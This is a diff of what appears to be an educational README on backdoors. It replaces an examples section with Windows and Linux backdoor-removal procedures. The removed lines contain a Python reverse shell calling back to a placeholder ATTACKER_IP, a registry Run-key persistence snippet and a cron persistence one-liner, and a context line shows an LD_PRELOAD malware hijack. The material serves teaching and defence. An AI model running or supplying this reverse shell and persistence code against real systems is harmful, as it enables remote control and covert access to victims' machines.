@@ -6,9 +6,6 @@
 
 </div>
 
-# THECODEX_REVERSESHELL
-
-Code taken from [0x18F/THECODEX_REVERSESHELL](https://github.com/0x18F/THECODEX_REVERSESHELL).
 ---
 
 ## 📚 Table of Contents
@@ -18,7 +15,7 @@ Code taken from [0x18F/THECODEX_REVERSESHELL](https://github.com/0x18F/THECODEX_
 - [Types of Backdoors](#types-of-backdoors)
 - [Persistence Mechanisms](#persistence-mechanisms)
 - [Detection & Prevention](#detection--prevention)
-- [Educational Examples](#educational-examples)
+- [Removal Procedures](#removal-procedures)
 - [Lab Setup](#lab-setup)
 - [Resources](#resources)
 
@@ -272,53 +269,146 @@ export LD_PRELOAD=/usr/lib/libmalware.so
 
 ---
 
-## Educational Examples
+## Removal Procedures
 
-### Example 1: Simple Reverse Shell (Python)
+### Windows Backdoor Removal
 
-```python
-import socket, subprocess, os
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(("ATTACKER_IP", 4444))
-while True:
-    cmd = s.recv(1024).decode()
-    if cmd == "exit":
-        break
-    output = subprocess.getoutput(cmd)
-    s.send(output.encode())
-s.close()
+#### 1. Identify the Backdoor
+
+- **Check Running Processes:**
+  ```cmd
+  tasklist /v
+  ```
+  Look for suspicious processes with unusual names or network connections
+
+- **Check Network Connections:**
+  ```cmd
+  netstat -ano
+  ```
+  Identify outbound connections to unknown IPs
+
+- **Check Startup Locations:**
+  - Registry Run keys
+  - Startup folder
+  - Scheduled tasks
+  - Services
+
+#### 2. Remove Registry Persistence
+
+```cmd
+# Check Run keys
+reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"
+reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
+
+# Remove suspicious entries
+reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SuspiciousEntry" /f
 ```
 
-**Detection:** Outbound connection to unknown IP, Python process with network activity
+#### 3. Remove Scheduled Tasks
 
-**Prevention:** Application whitelisting, network egress filtering
+```cmd
+# List all tasks
+schtasks /query /fo LIST
 
-### Example 2: Windows Registry Persistence
-
-```python
-import winreg
-key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
-                     r"Software\Microsoft\Windows\CurrentVersion\Run", 
-                     0, winreg.KEY_SET_VALUE)
-winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, 
-                 r"C:\Temp\updater.exe")
-winreg.CloseKey(key)
+# Delete suspicious task
+schtasks /delete /tn "SuspiciousTask" /f
 ```
 
-**Detection:** Registry change monitoring, startup entry analysis
+#### 4. Remove Malicious Services
 
-**Prevention:** Registry access restrictions, startup monitoring
+```cmd
+# List services
+sc query type= service state= all
 
-### Example 3: Linux Cron Persistence
+# Stop and delete service
+sc stop "SuspiciousService"
+sc delete "SuspiciousService"
+```
+
+#### 5. Clean Files
+
+- Delete malicious executables
+- Scan system with antivirus
+- Check for hidden files in system directories
+- Verify system file integrity with SFC
+
+### Linux Backdoor Removal
+
+#### 1. Identify the Backdoor
+
+- **Check Running Processes:**
+  ```bash
+  ps auxf
+  ```
+  Look for suspicious processes
+
+- **Check Network Connections:**
+  ```bash
+  netstat -tulpn
+  ss -tulpn
+  ```
+  Identify unusual listening ports or outbound connections
+
+- **Check Cron Jobs:**
+  ```bash
+  crontab -l
+  sudo crontab -l
+  cat /etc/crontab
+  ls -la /etc/cron.*
+  ```
+
+#### 2. Remove Cron Persistence
 
 ```bash
-# Add to crontab
-(crontab -l 2>/dev/null; echo "* * * * * /home/user/.config/update.sh") | crontab -
+# Edit crontab
+crontab -e
+# Remove suspicious entries
+
+# Check system cron
+sudo nano /etc/crontab
 ```
 
-**Detection:** Crontab monitoring, file integrity checking
+#### 3. Remove Systemd Services
 
-**Prevention:** Cron access restrictions, regular audits
+```bash
+# List services
+systemctl list-units --type=service
+
+# Stop and disable service
+sudo systemctl stop suspicious-service
+sudo systemctl disable suspicious-service
+
+# Remove service file
+sudo rm /etc/systemd/system/suspicious-service.service
+sudo systemctl daemon-reload
+```
+
+#### 4. Check SSH Keys
+
+```bash
+# Check authorized keys
+cat ~/.ssh/authorized_keys
+
+# Remove unknown keys
+nano ~/.ssh/authorized_keys
+```
+
+#### 5. Clean Files
+
+- Delete malicious executables
+- Check for hidden files in home directory
+- Scan system with antivirus/clamav
+- Check LD_PRELOAD environment variables
+- Verify package integrity
+
+### Post-Removal Steps
+
+1. **Change all passwords** - Especially for privileged accounts
+2. **Rotate SSH keys** - Generate new key pairs
+3. **Review logs** - Check for evidence of data exfiltration
+4. **Update system** - Apply all security patches
+5. **Monitor network** - Watch for suspicious activity
+6. **Rebuild from scratch** - If compromise is severe, consider reinstalling OS
 
 ---
 
